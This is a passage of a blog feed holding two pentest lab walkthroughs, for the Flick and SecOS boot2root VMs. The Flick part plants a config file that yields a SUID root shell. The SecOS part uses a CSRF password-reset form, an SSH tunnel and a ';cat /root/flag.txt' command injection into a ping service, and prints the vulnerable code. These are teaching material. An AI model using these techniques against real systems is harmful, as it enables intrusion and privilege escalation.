</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Bind socket to local host and port</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span> <span class="k">as</span> <span class="n">msg</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Bind failed. Error Code : &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">&#39; Message &#39;</span> <span class="o">+</span> <span class="n">msg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Start listening on socket</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Function for handling connections. This will be used to create threads</span>
</span><span class='line'><span class="k">def</span> <span class="nf">clientthread</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#Sending message to connected client</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;Welcome to the admin server. A correct password will </span><span class="se">\&#39;</span><span class="s">flick</span><span class="se">\&#39;</span><span class="s"> the switch and open a new door:</span><span class="se">\n</span><span class="s">&gt; &#39;</span><span class="p">)</span> <span class="c">#send only takes string</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#infinite loop so that function do not terminate and thread do not end.</span>
</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>        <span class="c">#Receiving from client</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>        <span class="n">reply</span> <span class="o">=</span> <span class="s">&#39;OK: &#39;</span> <span class="o">+</span> <span class="n">data</span>
</span><span class='line'>        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># check if the password is tabupJievas8Knoj</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s">&#39;tabupJievas8Knoj&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="n">return_code</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">&#39;command&#39;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">return_code</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Accepted! The door should be open now :poolparty:</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Accepted, but it doesn</span><span class="se">\&#39;</span><span class="s">t look like the door opened :&lt;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># add the prompt again</span>
</span><span class='line'>  <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&gt; &#39;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">reply</span><span class="p">)</span>
</span><span class='line'>    <span class="c">#came out of loop</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c">#now keep talking with the client</span>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="c">#wait to accept a connection - blocking call</span>
</span><span class='line'>    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.</span>
</span><span class='line'>    <span class="n">start_new_thread</span><span class="p">(</span><span class="n">clientthread</span> <span class="p">,(</span><span class="n">conn</span><span class="p">,))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>So this is the application that provided us with the first foothold on the box! The interesting part is that the program looks for a <em>config.py</em> in <em>/tmp/</em>, and if it can&rsquo;t find one there it loads it from <em>/etc/</em>. Let&rsquo;s see it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:~$ cat /etc/config.py
</span><span class='line'>config = {
</span><span class='line'>  'command': 'service apache2 restart'
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>So it runs a command?..This is great, because we can hijack it by creating a config file in <em>/tmp/</em> with code of our choosing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:~$ cat &gt; /tmp/config.py
</span><span class='line'>config = {
</span><span class='line'>        'command': 'cp /bin/sh /tmp/pwn; chmod 4777 /tmp/pwn'
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Copied the shell and gave it SUID and full access so we can execute it as root. Next we have to restart the program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obin@flick:~$ sudo /opt/start_apache/restart.sh
</span><span class='line'> * Restarting web server apache2                                                                                                                     apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
</span><span class='line'>apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
</span><span class='line'>                                                                                                                                              [ OK ]
</span><span class='line'>start_apache-8000: stopped
</span><span class='line'>start_apache-8000: started</span></code></pre></td></tr></table></div></figure>


<p>I looked in <em>/tmp/</em> but the shell wasn&rsquo;t there, so I tried again to connect to port 8881 and give the password. And indeed, now there is a shell waiting there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:~$ ls -l /tmp/
</span><span class='line'>total 112
</span><span class='line'>-rw-rw-r-- 1 robin robin     75 Apr  1 14:08 config.py
</span><span class='line'>-rwsrwxrwx 1 root  root  109768 Apr  1 14:17 pwn</span></code></pre></td></tr></table></div></figure>


<p>Game over!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robin@flick:~$ /tmp/pwn
</span><span class='line'># whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<blockquote><p>You will be run over by a beer truck.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - SecOS]]></title>
    <link href="http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos/"/>
    <updated>2015-02-04T06:36:51-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos</id>
    <content type="html"><![CDATA[<p>SecOS is a web based VM created by PaulSec. Here is the briefing:</p>

<blockquote><p>Not too tired after BSides London? Still want to solve challenges? Here is the VM I told about during my talk where you&rsquo;ll have to practice some of
your skills to retrieve the precious flag located here: /root/flag.txt. This VM is an entry-level boot2root and is web based.</p></blockquote>

<!-- more -->


<p>The beginning should be familiar by now&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.80.128
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-04 13:36 EET
</span><span class='line'>Nmap scan report for 192.168.80.128
</span><span class='line'>Host is up (0.00085s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>22/tcp   open  ssh     (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
</span><span class='line'>|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
</span><span class='line'>|_  256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
</span><span class='line'>8081/tcp open  http    Node.js (Express middleware)
</span><span class='line'>|_http-title: Secure Web App
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
</span><span class='line'>SF-Port22-TCP:V=6.47%I=7%D=2/4%Time=54D20435%P=x86_64-unknown-linux-gnu%r(
</span><span class='line'>SF:NULL,27,"SSH-2\.0-OpenSSH_6\.6p1\x20Ubuntu-2ubuntu1\r\n");
</span><span class='line'>MAC Address: 00:0C:29:F4:5D:DC (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.11 - 3.14</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what&rsquo;s running on port 8081:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/site.png" title="secos site" alt="site"></p>

<p>Looking at the about page, we can see the site is really secure!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/about.png" title="secos about" alt="about"></p>

<p>Also, there is some sort of hint in the source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--&lt;li&gt;&lt;a href=&quot;/hint&quot;&gt;Wanna help?&lt;/a&gt;&lt;/li&gt;!--&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Checking that page, there is this message:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/doh.png" title="troll" alt="troll"></p>

<p>Well, there is something to see in the source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--</span>
</span><span class='line'><span class="c">        First: the admin visits the website (really) frequently</span>
</span><span class='line'><span class="c">        Second: He runs it locally, on 127.0.0.1. </span>
</span><span class='line'><span class="c">        Third: CSRF and /(http:\/\/[-\/\.\w:0-9\?&amp;]+)/gi, I think that&#39;s enough</span>
</span><span class='line'><span class="c">        !--&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I created a user to check the functionality of the app. It seems you can send and receive messages between users. The spiderman user is the admin, so we&rsquo;re mainly interested in that account. Using the hint, the likely course seems to be crafting a CSRF request to change the admin&rsquo;s password and sending it to him in a message.</p>

<p>First, a HTML form that will take care of resetting the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;</span>
</span><span class='line'><span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">&quot;changepass&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">action=</span><span class="s">&quot;http://127.0.0.1:8081/change-password&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span> <span class="na">value=</span><span class="s">&quot;spiderman&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span> <span class="na">value=</span><span class="s">&quot;pwned&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">changepass</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span><span class='line'><span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Breaking it up, the form submits the username and password (which are hidden because we are using Javascript to send them to the server, and not clicking buttons ourselves) to the change password page. Because of the hint we found in the source code, we are using the localhost address instead of the machine&rsquo;s IP. I copied it to <code>/var/www/</code> and served it with apache.</p>

<p>And now to send a message to spiderman, with a URL for him to click:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/sendcsrf.png" title="sendcsrf" alt="sendcsrf"></p>

<p>Success! His password was reset and we can log in with the new password that we&rsquo;ve just set. In the Messages section, we see that another user also had less than honorable intentions:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/pirate.png" title="pirate" alt="pirate"></p>

<p>Next thing I did was try to SSH into the box as spiderman, with the password <em>CrazyPassword!</em>. And it worked! In spiderman&rsquo;s home directory, there is a folder called <em>vnwa</em>..a vulnerable web application maybe? I found something potentially interesting buried in the <em>internalServer.js</em> code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>spiderman@SecOS-1:~/vnwa$ cat internalServer.js 
</span><span class='line'>var fs = require('fs');
</span><span class='line'>var express = require('express');
</span><span class='line'>var http = require('http');
</span><span class='line'>var sys = require('sys')
</span><span class='line'>var exec = require('child_process').exec;
</span><span class='line'>var crypto = require('crypto');
</span><span class='line'>
</span><span class='line'>var utils = require('./lib/utils.js');
</span><span class='line'>var model = require('./lib/model.js');
</span><span class='line'>
</span><span class='line'>var app = express();
</span><span class='line'>var server = http.createServer(app); 
</span><span class='line'>
</span><span class='line'>var logger = function (req, res, next) {
</span><span class='line'>    console.log(req.connection.remoteAddress + " tried to access : " + req.url);
</span><span class='line'>    next(); // Passing the request to the next handler in the stack.
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>// Configuration
</span><span class='line'>app.configure(function () {
</span><span class='line'>    // Session management
</span><span class='line'>    app.use(express.cookieParser());
</span><span class='line'>    app.use(express.session({secret: 'privateKeyForSession'}));
</span><span class='line'>    app.use("/js", express.static(__dirname + '/public/js')); // javascript folder
</span><span class='line'>    app.use("/css", express.static(__dirname + '/public/css')); // javascript folder
</span><span class='line'>
</span><span class='line'>    app.set('views', __dirname + '/views'); // views folder
</span><span class='line'>    app.set('view engine', 'ejs'); // view engine for this projet : ejs 
</span><span class='line'>
</span><span class='line'>    app.use(express.bodyParser()); // for POST Requests
</span><span class='line'>    app.use(logger); // Here you add your logger to the stack.
</span><span class='line'>    app.use(app.router); // The Express routes handler.
</span><span class='line'>});
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>app.get('/', function (req, res) {
</span><span class='line'>    res.render('ping.ejs', {
</span><span class='line'>        isConnected: req.session.isConnected,
</span><span class='line'>        isAdmin: req.session.isAdmin
</span><span class='line'>    });
</span><span class='line'>});
</span><span class='line'>
</span><span class='line'>// Update password
</span><span class='line'>app.post('/', function (req, res) {
</span><span class='line'>    ip = req.body.ip
</span><span class='line'>    if (ip == "") {
</span><span class='line'>        utils.redirect(req, res, '/ping-status');
</span><span class='line'>    } else {
</span><span class='line'>        // getting the command with req.params.command
</span><span class='line'>        var child;
</span><span class='line'>        // console.log(req.params.command);
</span><span class='line'>        child = exec('ping ' + ip, function (error, stdout, stderr) {
</span><span class='line'>            res.render('ping.ejs', {
</span><span class='line'>                isConnected: req.session.isConnected,
</span><span class='line'>                message: stdout,
</span><span class='line'>                isAdmin: req.session.isAdmin
</span><span class='line'>            });
</span><span class='line'>        });
</span><span class='line'>    }
</span><span class='line'>});
</span><span class='line'>
</span><span class='line'>server.listen(9000, '127.0.0.1', function() {
</span><span class='line'>  console.log("Listening on port 9000");
</span><span class='line'>});</span></code></pre></td></tr></table></div></figure>


<p>Indeed, this app is listening on port 9000:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>spiderman@SecOS-1:~/vnwa/scripts$ netstat -antp
</span><span class='line'>(Not all processes could be identified, non-owned process info
</span><span class='line'> will not be shown, you would have to be root to see it all.)
</span><span class='line'>Active Internet connections (servers and established)
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span><span class='line'>tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -               
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>By looking at the code, it seems it&rsquo;s a pinging app. During the enumeration phase, I also noticed that unlike the web server we&rsquo;ve exploited, this internal server is run by root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps aux
</span><span class='line'>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span><span class='line'>...
</span><span class='line'>root       186  0.0  0.1   4692   960 ?        Ss   11:40   0:00 sudo -u spiderman sh -c /usr/local/bin/node /home/spiderman/vnwa/server.js
</span><span class='line'>root       188  0.0  0.1   4692   956 ?        Ss   11:40   0:00 sudo -u root sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>To access this application, I set up a SSH tunnel. On my machine, I ran this command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -f -N -L 4444:127.0.0.1:9000 -l spiderman 192.168.80.128</span></code></pre></td></tr></table></div></figure>


<p>This allowed me to connect to the remote application on port 9000 from the browser of my Kali machine. Let me break it up:</p>

<ul>
<li><p><strong>-f</strong> Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.</p></li>
<li><p><strong>-N</strong> Do not execute a remote command.  This is useful for just forwarding ports.</p></li>
<li><p><strong>-L</strong> [bind_address:]port:host:hostport</p></li>
</ul>


<p>Specifies that the given port on the local (client) host is to be
forwarded to the given host and port on the remote side.  This
works by allocating a socket to listen to <strong>port</strong> on the local side,
optionally bound to the specified <strong>bind_address</strong>.  Whenever a connection is made to this port, the connection is forwarded over
the secure channel, and a connection is made to <strong>host</strong> port
<strong>hostport</strong> from the remote machine.</p>

<ul>
<li><p><strong>-l</strong> Specifies the user to log in as on the remote machine.</p></li>
<li><p><strong>192.168.80.128</strong> The IP address of the SecOS box</p></li>
</ul>


<p>What this did was forwarding the connections to port 4444 on my local machine to the remote server on port 9000. Remember that the application is only listening on the localhost interface on the SecOS box. So, the SecOS machine is acting as a sort of gateway, tunneling the connections I point to my 4444 port to the 9000 port on localhost. You can read some more about how this works on <a href="http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels">http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels</a></p>

<p>Now, in my browser, I went to <a href="http://127.0.0.1:4444/">http://127.0.0.1:4444/</a> and:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/ping.png" title="ping" alt="ping"></p>

<p>I tried pinging my Kali machine to see if it works but it just appeared to hang. So I tried limiting the amount of pings by entering <code>-c 2</code> after the IP to be pinged. And it worked!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/pingres.png" title="ping result" alt="ping result"></p>

<p>We know the ping app is running as root, so if we can do remote code execution, we&rsquo;ll be able to run commands as root. And the application is vulnerable to just what we need! Remember these lines from the internal server code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">ip</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">ip</span>
</span><span class='line'><span class="nx">child</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ping &#39;</span> <span class="o">+</span> <span class="nx">ip</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <em>ip</em> variable is passed to the <em>exec</em> function without any prior input sanitization. So, we just close the first command (which would be the ping), and insert an additional command of our choosing, which in this case will be to read the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>;cat /root/flag.txt</span></code></pre></td></tr></table></div></figure>


<p>And profit!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/win.png" title="flag" alt="flag"></p>

<blockquote><p>Don&rsquo;t tell any big lies today.  Small ones can be just as effective.</p></blockquote>
]]></content>
  </entry>
  
</feed>
